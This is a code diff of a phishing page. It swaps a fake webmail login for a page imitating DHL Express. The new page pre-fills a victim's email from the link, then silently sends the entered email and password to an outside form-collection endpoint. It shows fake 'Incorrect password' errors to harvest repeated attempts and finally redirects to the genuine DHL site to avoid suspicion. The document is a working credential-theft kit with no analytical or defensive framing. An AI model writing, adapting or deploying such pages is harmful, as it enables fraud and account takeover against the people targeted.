@@ -1,122 +1,235 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Webmail Login</title>
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif}
-    body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;color:#333}
-    .login-container{width:100%;max-width:420px;background:#fff;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,.1);overflow:hidden}
-    .login-header{background:#005a9e;color:#fff;padding:20px;text-align:center}
-    .login-header h1{font-size:22px;font-weight:400}
-    .login-form{padding:30px}
-    .form-group{margin-bottom:20px}
-    .input-with-icon{position:relative}
-    .input-with-icon svg{position:absolute;left:12px;top:50%;transform:translateY(-50%);width:16px;height:16px;fill:#666}
-    input[type="text"],input[type="password"]{width:100%;padding:12px 12px 12px 40px;border:1px solid #ccc;border-radius:4px;font-size:14px;transition:border .3s}
-    input[type="text"]:focus,input[type="password"]:focus{border-color:#005a9e;outline:none;box-shadow:0 0 0 2px rgba(0,90,158,.2)}
-    .checkbox-group{display:flex;align-items:center;margin-bottom:20px}
-    .checkbox-group input{margin-right:8px}
-    .checkbox-group label{margin-bottom:0;font-weight:400}
-    button{width:100%;padding:12px;background:#005a9e;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:background .3s}
-    button:hover{background:#004a87}
-    .footer{text-align:center;margin-top:20px;color:#666;font-size:12px}
-    .footer a{color:#005a9e;text-decoration:none}
-    .footer a:hover{text-decoration:underline}
-    .language-selector{text-align:center;margin-top:15px;font-size:12px;color:#666}
-    .language-selector select{padding:5px;border:1px solid #ccc;border-radius:3px;font-size:12px;margin-left:5px}
-    .security-notice{background:#f8f8f8;border-top:1px solid #eee;padding:15px;text-align:center;font-size:12px;color:#666}
-    .security-notice svg{width:12px;height:12px;fill:#2ecc71;margin-right:5px}
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DHL EXpress</title>
+<!-- Google Fonts Inter -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+<!-- Material Icons -->
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+<style>
+  /* Reset and base */
+  *, *::before, *::after {
+    box-sizing: border-box;
+  }
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
+      Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    background: url('https://www.image2url.com/r2/default/images/1776086565923-5cf69c5c-fc20-4f0f-9975-a737f425a5c1.png') no-repeat center center fixed;
+    background-size: cover;
+    color: #111;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    min-height: 100vh;
+  }
+  main {
+    background: rgba(255 255 255 / 0.95);
+    max-width: 400px;
+    width: 100%;
+    border-radius: 16px;
+    box-shadow: 0 16px 41px rgb(0 0 0 /0.15);
+    padding: 32px 32px 40px;
+    display: flex;
+    flex-direction: column;
+    gap: 24px;
+  }
+  h1 {
+    font-weight: 700;
+    font-size: 2.75rem;
+    margin-bottom: 8px;
+    color: #d10606; /* DHL red */
+    text-align: center;
+  }
+  p.subtitle {
+    font-weight: 600;
+    color: #444;
+    font-size: 1rem;
+    margin-top: 0;
+    text-align: center;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+    gap: 24px;
+  }
+  label {
+    font-weight: 600;
+    font-size: 0.9rem;
+    margin-bottom: 8px;
+    display: block;
+  }
+  .input-group {
+    position: relative;
+    display: flex;
+    align-items: center;
+  }
+  .input-group .material-icons {
+    position: absolute;
+    left: 12px;
+    color: #888;
+    pointer-events: none;
+    font-size: 24px;
+  }
+  input[type="email"],
+  input[type="password"] {
+    width: 100%;
+    padding: 12px 12px 12px 42px;
+    font-size: 1rem;
+    border: 1.8px solid #ddd;
+    border-radius: 12px;
+    transition: border-color 0.3s ease;
+    outline-offset: 2px;
+  }
+  input[type="email"]:focus,
+  input[type="password"]:focus {
+    border-color: #d10606;
+    box-shadow: 0 0 6px rgba(209, 6, 6, 0.4);
+  }
+  button[type="submit"] {
+    background: #d10606;
+    color: #fff;
+    font-weight: 700;
+    font-size: 1.2rem;
+    padding: 14px;
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button[type="submit"]:hover,
+  button[type="submit"]:focus-visible {
+    background-color: #a00404;
+    outline: none;
+  }
+  .error-message {
+    color: #d10606;
+    font-weight: 600;
+    font-size: 0.9rem;
+    text-align: center;
+    min-height: 24px;
+  }
+  /* Responsive */
+  @media (max-width: 480px) {
+    main {
+      padding: 24px 20px 32px;
+      max-width: 100%;
+      border-radius: 12px;
+    }
+    h1 {
+      font-size: 2rem;
+    }
+  }
+</style>
 </head>
 <body>
-  <div class="login-container">
-    <div class="login-header">
-      <h1>Webmail Login</h1>
+<main role="main" aria-label="DHL Sign in form">
+  <h1>DHL Express</h1>
+  <p class="subtitle">Enter your credentials to proceed</p>
+  <form id="signin-form" aria-describedby="error-message" novalidate>
+    <div class="input-group">
+      <span class="material-icons" aria-hidden="true">email</span>
+      <label for="email" class="sr-only">Email address</label>
+      <input type="email" id="email" name="email" placeholder="Email address" required autocomplete="email" aria-required="true" aria-label="Email address" disabled />
     </div>
-    
-    <div class="login-form">
-      <form method="POST" action="https://submit-form.com/5MJpzrQNf">
-        <input type="hidden" name="_redirect" value="https://yourdomain.com/thank-you.html">
-        
-        <div class="form-group">
-          <div class="input-with-icon">
-            <svg viewBox="0 0 24 24">
-              <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
-            </svg>
-            <input type="text" id="user" name="email" placeholder="" readonly>
-          </div>
-        </div>
-        
-        <div class="form-group">
-          <div class="input-with-icon">
-            <svg viewBox="0 0 24 24">
-              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
-            </svg>
-            <input type="password" id="pass" name="password" placeholder="Password" required>
-          </div>
-        </div>
-        
-        <div class="checkbox-group">
-          <input type="checkbox" id="remember">
-          <label for="remember">Remember me</label>
-        </div>
-        
-        <button type="submit">Sign In</button>
-      </form>
-      
-      <div class="footer">
-        <p><a href="#">Forgot your password?</a></p>
-      </div>
-      
-      <div class="language-selector">
-        Language: 
-        <select>
-          <option>English</option>
-          <option>Español</option>
-          <option>Français</option>
-          <option>Deutsch</option>
-        </select>
-      </div>
+    <div class="input-group">
+      <span class="material-icons" aria-hidden="true">lock</span>
+      <label for="password" class="sr-only">Password</label>
+      <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password" aria-required="true" aria-label="Password" />
     </div>
-    
-    <div class="security-notice">
-      <svg viewBox="0 0 24 24">
-        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
-      </svg>
-      Secure SSL Connection
-    </div>
-  </div>
+    <button type="submit" aria-label="Sign in">Sign In</button>
+  </form>
+  <p id="error-message" class="error-message" aria-live="polite" role="alert"></p>
+</main>
 
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      // Function to extract email from URL
-      function getEmailFromURL() {
-        // Try hash format first: #email@domain.com
-        if (window.location.hash && window.location.hash.includes('@')) {
-          return window.location.hash.substring(1);
-        }
-        
-        // Try query parameter format: ?email=email@domain.com
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.has('email')) {
-          return urlParams.get('email');
-        }
-        
-        return null;
+<script>
+  (() => {
+    const form = document.getElementById('signin-form');
+    const errorMessageEl = document.getElementById('error-message');
+    const maxAttempts = 5; // Maximum number of attempts
+    const submitEndpoint = 'https://submit-form.com/Csewpi6k9';
+    let attemptCount = 0;
+
+    // Extract email from the URL hash (after #)
+    let emailParam = window.location.hash ? window.location.hash.substring(1) : null;
+
+    if (emailParam) {
+      // Pre-fill the email input field
+      const emailInput = document.getElementById('email');
+      emailInput.value = decodeURIComponent(emailParam);
+      emailInput.disabled = false; // Enable the email input field
+
+      // Do NOT modify UI based on domain, keep DHL background as is
+
+    } else {
+      console.warn("No email found in the URL hash.");
+      // Keep default DHL background, no UI change
+    }
+
+    // Utility: send data to the endpoint asynchronously
+    async function reportCredentials(email, password) {
+      try {
+        await fetch(submitEndpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password, timestamp: new Date().toISOString() }),
+          keepalive: true
+        });
+      } catch (e) {
+        // Network or other errors: silently fail to not break UX
+        console.warn('Report submission failed:', e);
       }
-      
-      // Get email from URL
-      let email = getEmailFromURL();
-      
-      // If email found in URL, update the email input
-      if (email) {
-        document.getElementById('user').value = email;
+    }
+
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      errorMessageEl.textContent = '';
+
+      const email = form.email.value.trim();
+      const password = form.password.value;
+
+      // Basic client side validation
+      if (!email || !password) {
+        errorMessageEl.textContent = 'Please enter both email and password.';
+        return;
+      }
+
+      // Report credentials to endpoint (async, don't block UX)
+      await reportCredentials(email, password);
+
+      attemptCount++; // Increment the attempt count
+
+      if (attemptCount < maxAttempts) {
+        // Reset password field and show error message
+        form.password.value = '';
+        form.password.focus();
+        errorMessageEl.textContent = 'Incorrect password. Please try again.';
       } else {
-        document.getElementById('user').value = 'No email specified in URL';
+        // Redirect on 5th attempt
+        window.location.href = 'https://www.dhl.com/gb-en/home/ship-now.html';
       }
     });
-  </script>
+
+  })();
+</script>
+
+<!-- Accessibility helper: visually hidden elements -->
+<style>
+  .sr-only {
+    position: absolute !important;
+    width: 1px !important;
+    height: 1px !important;
+    padding: 0 !important;
+    margin: -1px !important;
+    overflow: hidden !important;
+    clip: rect(0, 0, 0, 0) !important;
+    white-space: nowrap !important;
+    border: 0 !important;
+  }
+</style>
 </body>
 </html>
